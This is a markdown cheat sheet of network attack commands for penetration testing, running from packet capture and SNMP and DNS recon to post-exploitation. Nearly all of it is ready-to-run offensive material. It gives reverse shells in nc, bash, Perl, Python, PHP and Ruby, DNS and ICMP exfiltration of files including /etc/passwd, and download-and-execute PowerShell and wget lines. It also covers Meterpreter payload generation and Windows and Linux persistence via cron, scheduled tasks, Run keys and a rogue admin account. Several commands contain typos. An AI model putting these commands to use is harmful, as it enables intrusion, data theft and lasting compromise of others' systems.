# NETWORK

1. [TCPDump](#tcpdump)
2. [Recon](#recon)
3. [IPv6 Attacks](#ipv6-attacks)
4. [SOCAT](#socat)
5. [Cisco Commands ](#cisco-commands)
6. [SNMP](#snmp)
7. [DNS](#dns)
8. [File Transfer](#file-transfer)
9. [Open Mail Relay ](#open-mail-relay)
10. [Reverse Shells ](#reverse-shells )
11. [METERPRETER](#meterpreter)
12. [Persistence ](#persistence)
13. [Tunneling](#tunneling)

## TCPDump 

### CAPTURE PACKETS ON ETH0 IN ASCII AND HEX AND WRITE TO FILE
```shell
tcpdump -i eth0 -XX -w out.pcap 
```

### CAPTURE HTTP TRAFFIC TO 2.2.2.2
```shell
tcpdump -i eth0 port 80 dst 2.2.2.2 
```

### SHOW CONNECTIONS TO A SPECIFIC IP
```shell
tcpdump -i eth0 -tttt dst 192.168.1.22 and not net 192.168.1.0/24 
```

### PRINT ALL PING RESPONSES
```shell
tcpdump -i eth0 'icmp[icmptype] == icmp-echoreply' 
```

### CAPTURE 50 DNS PACKETS AND PRINT TIMESTAMP
```shell
tcpdump -i eth0 -c 50 -tttt 'udp and port 53' 
```

### Replay Pcap
```shell
file2cable -i ethO -f file.pcap 
tcpreplay --topspeed --loop=0 --intf=eth0 .pcap_file_to replay mbps=10|100|1000     #Replay packet DOS
```


##  Recon  

### unumerates linux boxes, needs apt-get install rpcbind nfs-common
```shell
rpcinfo -p <ip> 
```

### enum windows boxes
```shell
rpcclient -U "" <IP> 
```


##  IPv6 Attacks

```shell
Remote Network DoS:
rsumrf6 ethX <remote ipv6>
```


##  SOCAT  

### SOCAT TUNNEL IPv6 THROUGH IPv4 TOOLS

```shell
socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80
./nikto.pl -host 127.0.0.1 -port 8080
```


##  Cisco Commands  
```shell
#Enter privilege mode
enable 

#Configure interface
configure terminal 

#Configure FastEthernet 0/0
(config)#interface fa0/0 

#Add IP to fa0/0
(config-if)#ip addr 1.1.1.1 255.255.255.0 

#Configure vty line
(config)#line vty 0 4 

#Set telnet password
(config-line)#login 
(config-line)#password <password> 

#Open sessions
show session 

#IOS version
show version 

#Available files
dir file systems 

#File information
dir all-filesystems 

#Deleted files
dir /all 

#Config loaded in mem
show running-config 

#Config loaded at boot
show startup-config 

#Interfaces
show ip interface brief 

#Detailed interface info
show interface eO 

#Routes
show ip route 

#Access lists
show access-lists 

#No limit on output
terminal length 0 

#Replace run w/ start config
copy running-config startup-config 

#Copy run config to TFTP Svr
copy running-config tftp 
```


### CISCO IOS 11.2-12.2 VULNERABILITY

```shell
http://ip/level/16-99/exec/show/config
```


##  SNMP  

### REGISTRY KEYS

```shell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

### MUST START TFTP SERVER 1ST

```shell
./snmpblow.pl -s <srcip> -d <rtr_ip> -t attackerip -f out.txt < snmpstrings.txt
```

### WINDOWS RUNNING SERVICES:

```shell
snmpwalk -c public -v1 <ip> 1 |grep hrSWRunName |cut -d" " -f4
snmpwalk -c public -v1 8.8.8.8
```

### WINDOWS OPEN TCP PORTS :

```shell
smpwalk ... |grep tcpConnState |cut -d" " -f6 |sort -u
```

### WINDOWS INSTALLED SOFTWARE:

```shell
smpwalk ... |grep hrSWInstalledName
```

### WINDOWS USERS:

```shell
snmpwalk .. <ip> 1.3 | grep 77.1.2.25 ... -f4
```


##  DNS 

### Reverse lookup for IP range:
```shell
dnsrecon -t rvs -i 192.1.1.1,192.1.1.20 
```

### Retrieve standard DNS records:
```shell
dnsrecon -t std -d domain.com 
```

### Enumerate subdomains:
```shell
dnsrecon -t brt -d domain.com -w hosts.txt 
```

### DNS zone transfer:
```shell
dnsrecon -d domain.com -t axfr 
```

### NMAP REVERSE DNS LOOKUP AND OUTPUT PARSER

```shell
nmap -R -sL -Pn -dns-servers <dns svr ip> <range> | awk '{if(($1" "$2" "$3)=="Nmap scan report")print$5" "$6}' | sed 's/(//g' | sed 's/)//g' > dns.txt
```


##  File Transfer 

### FTP THROUGH NON-INTERACTIVE SHELL

```shell
echo open <ip> 21 > ftp.txt
echo <user> >> ftp.txt
echo <pass> >> ftp.txt
echo bin >> ftp.txt
echo GET >> file ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

### DNS TRANSFER ON LINUX

```shell
#On victim:
1. Hex encode the file to be transferred
xxd -p secret > file.hex

2. Read in each line and do a DNS lookup
for b in `cat file.hex`; do dig $b.shell.evilexample.com; done

#On attacker:
1. Capture DNS exfil packets
tcdpump -w /tmp/dns -s0 port 53 and host system.example.com

2. Cut the exfilled hex from the DNS packet
tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d' ' | cut -f1 -d'.' | uniq > received.txt

3. Reverse the hex encoding
xxd -r -p < received.txt > keys.pgp
```

### EXFIL COMMAND OUTPUT ON A LINUX MACHINE OVER ICMP

```shell
#On victim (never ending l liner) :
stringZ=`cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n"`;
counter=0; while(($counter - ${#stringZ}));do ping -s 16 -c 1 -p ${stringZ:$counter:16} 192.168.10.10 && counter=$((counter+16)) ;done
#On attacker (capture packets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' > data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p
```

### WINDOWS - CERTUTIL

```shell
#Download a file
certutil.exe -urlcache -split -f https://myserver/filename outputfilename

#Encode a file (easy copy/paste with RDP)
certutil.exe -encode .\bin.exe .\bin.txt
certutil.exe -decode .\bin.txt .\bin.exe
```

### WINDOWS - FTP

```shell
echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
ftp -v -n -s:ftp.txt
```

### WINDOWS - POWERSHELL CLI

### download file
```shell
Invoke-WebRequest "https://myserver/filename" -OutFile "C:\Windows\Temp\filename" 
```

### download file
```shell
(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") 
```

### download script to memory
```shell
IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1") 
```

### WINDOWS - POWERSHELL SCRIPT NON-INTERACTIVE

```shell
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://IPADDRESS/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```


##  Open Mail Relay 

```shell
C:\ telnet x.x.x.x 25
HELO x.x.x.x
MAIL FROM: me@you.com
RCPT TO: you@you.com
DATA
Thank You.
.
Quit
```


##  Reverse Shells 

### NETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)

### Linux reverse shell
```shell
nc 10.0.0.1 1234 -e /bin/sh 
```

### Windows reverse shell
```shell
nc 10.0.0.1 1234 -e cmd.exe 
```

### NETCAT (SOME VERSIONS DON'T SUPPORT -E OPTION)

```shell
nc -e /bin/sh 10.0.0.1 1234
```

### NETCAT WORK-AROUND WHEN -E OPTION NOT POSSIBLE

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 10.0.0.1 1234 > /tmp/f
```

### PERL

```shell
perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet-aton($i)))){open(STDIN,">&S") ;open(STDOUT,">&S"); open (STDERR,">$S"); exec("/bin/sh -i");};'
```

### PERL WITHOUT /BIN/SH

```shell
perl -MIO -e '$p=fork; exit, if ($p);$c=new IO::Socket::INET(PeerAddr,"<attackerip>:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PERL FOR WINDOWS

```shell
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attackerip>:4444") ;STDIN->fdopen($c,r) ;$~->fdopen($c,w) ;system$_ while<>;'
```

### PYTHON

```shell
python -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### BASH

```shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### JAVA

```shell
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### PHP

```shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### RUBY

```shell
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### RUBY WITHOUT /BIN/SH

```shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, "r"){|io|c.print io.read}end'
```

### RUBY FOR WINDOWS

```shell
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### TELNET

```shell
rm -f /tmp/p; mknod /tmp/p p && telnet <attackerip> 4444 0/tmp/p
telnet <attackerip> 4444 | /bin/bash | telnet <attackerip> 4445
```

### X TERM

```shell
xterm -display 10.0.0.1:1
o Start Listener: Xnest :1
o Add permission to connect: xhost +victimIP
```

### Misc

```shell
wget http://<server>/backdoor.sh -O- | sh Downloads and runs backdoor.sh
```


## METERPRETER 

### Generate quick payload

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=152.32.41.172 LPORT=4444 -f exe
msfvenom -p linux/x86/meterpreter_reverse_http LHOST=10.2.232.43 LPORT=4444 -f exe -o meterpreter_http.exe
```

### msfconsole handler

```shell
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 91.121.137.69
set lport 8080
exploit -j
```

### Port forward

```shell
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.10
```

### Add route

```shell
run autoroute -s 10.1.13.0/24
run autoroute -p
```


##  Persistence 

### FOR LINUX PERSISTENCE (ON ATTACK BOX)

```shell
crontab -e : set for every 10 min
0-59/10 * * * * nc <ip> 7777 -e /bin/bash
```

### WINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)

```shell
sc config schedule start= auto
net start schedule
at 13:30 ""C:\nc.exe <ip> 7777 -e cmd.exe""
```

### WINDOWS TASK SCHEDULER PERSISTENCE 2

```shell
sc config "Vulnerable Service" binpath="net user eviladmin P4ssw0rd@ /add"              
sc config "Vulnerable Service" obj= ".\LocalSystem" password= ""                         
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
sc qc "Vulnerable Service"
```

### WINDOWS PERSISTENT BACKDOOR WITH FIREWALL BYPASS

```shell
1. REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v firewall /t REG_SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

### REMOTE PAYLOAD DEPLOYMENT VIA SMB OR WEBDAV [6]

```shell
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload
Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set following options:
        -localexe=true
        -localfile=<payload>
        -localroot=<payload directory>
        -disablepayloadhandler=true
3. Use psexec or wmic command to remotely execute payload
psexec \\<remote ip> /u domain\compromised_user /p password "\\<payload ip>\test\msf.exe"
--OR -
wmic /node:<remote ip> /user:domain\compromised_user //password:password process call create "\\<payload ip>\test\msf.exe"
```


##  Tunneling 

### FPIPE - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2.2.2.2

```shell
fpipe.exe -l 1234 -r 80 2.2.2.2
```

### SOCKS.EXE- SCAN INTRANET THROUGH SOCKS PROXY

```shell
On redirector (1.1.1.1):
> socks.exe -i1.1.1.1 -p 8080
On attacker:
Modify /etc/proxychains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 127.0.0.1 9050
Add line: socks4        1.1.1.1        8080
Scan through socks proxy:
> proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2
```

### SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2

```shell
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80
```

### STUNNEL - SSL ENCAPSULATED NC TUNNEL (WINDOWS & LINUX) [ 8]

```shell
On attacker (client):
Modify /stunnel.conf
    client = yes
    [netcat client]
    accept = 5555
    connect = -Listening IP-:4444
On victim (listening server)
Modify /stunnel.conf
    client = no
    [netcat server]
    accept 4444
    connect = 7777
C:\> nc -vlp 7777
On attacker (client)
# nc -nv 127.0.0.1 5555
```

### NC PIVOT

```shell
cd /tmp
mknod backpipe q
nc -v -l -p 4444 0<backpipe | nc <T1IP> 80 | tee backpipe
```

### Dynamic SSH Socks Tunnel with proxychains

```shell
ssh /tmp/Rd.s user -Nf -D 0.0.0.0:1090
proxychains /bin/bash
socat UDP-listen:22,reuseaddr,fork UDP:10.10.100.170:22 &
socat tcp4-listen:22,reuseaddr,fork tcp-4:10.10.100.170:22 &
```

### WINDOWS Port forwarding with Putty plink

```shell
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
```

